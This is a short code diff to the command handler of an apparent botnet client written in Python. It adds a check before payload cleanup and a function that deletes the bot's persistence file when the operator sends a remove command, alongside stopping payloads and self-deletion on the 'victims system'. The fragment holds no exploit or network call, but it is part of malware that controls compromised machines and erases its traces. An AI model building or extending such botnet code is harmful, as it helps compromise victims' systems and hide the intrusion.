@@ -77,11 +77,20 @@ class CommandHandler:
     # Remove all payload files from the bot's system
     def __cleanupPayloads(self):
         path = "./payloads"
+
+        if not os.path.exists(path):
+            return
+
         dir_list = os.listdir(path)
 
         for file in dir_list:
             os.remove(path + "/" + file)
         os.removedirs(path)
+
+    
+    # Remove the presistant data file from the bot's system
+    def __cleanupPresistantData(self):
+        os.remove("Botnet_precistantData.txt")
 
 
     # Delete bot executable from victims system
@@ -126,6 +135,7 @@ class CommandHandler:
         elif cmd == Command.REMOVE:
             self.__stopPayload()
             self.__cleanupPayloads()
+            self.__cleanupPresistantData()
             self.__schedule_self_delete()
         else:
             print ("Received unknown command, ignoring...")
